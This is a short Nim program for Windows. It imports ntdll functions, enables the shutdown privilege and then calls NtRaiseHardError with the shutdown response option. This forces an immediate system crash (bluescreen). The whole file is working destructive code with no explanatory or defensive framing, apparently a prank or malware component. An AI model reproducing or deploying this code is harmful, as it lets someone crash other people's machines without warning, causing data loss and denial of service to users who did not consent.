import winim


proc RtlAdjustPrivilege*(privilege: ULONG, bEnablePrivilege: BOOLEAN, isThreadPrivilege: BOOLEAN, previousValue: PBOOLEAN): NTSTATUS
    {.discardable, stdcall, dynlib: "ntdll", importc: "RtlAdjustPrivilege".}

proc NtRaiseHardError*(errorStatus: NTSTATUS, numberOfParameters: ULONG, unicodeStringParameterMask: ULONG, parameters: PULONG_PTR, validResponseOption: ULONG, response: PULONG): NTSTATUS
    {.discardable, stdcall, dynlib: "ntdll", importc: "NtRaiseHardError".}

var 
    prev: BOOLEAN
    response: ULONG

# SE_SHUTDOWN_PRIVILEGE = 19
discard RtlAdjustPrivilege(19, TRUE, FALSE, &prev)

discard NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &response);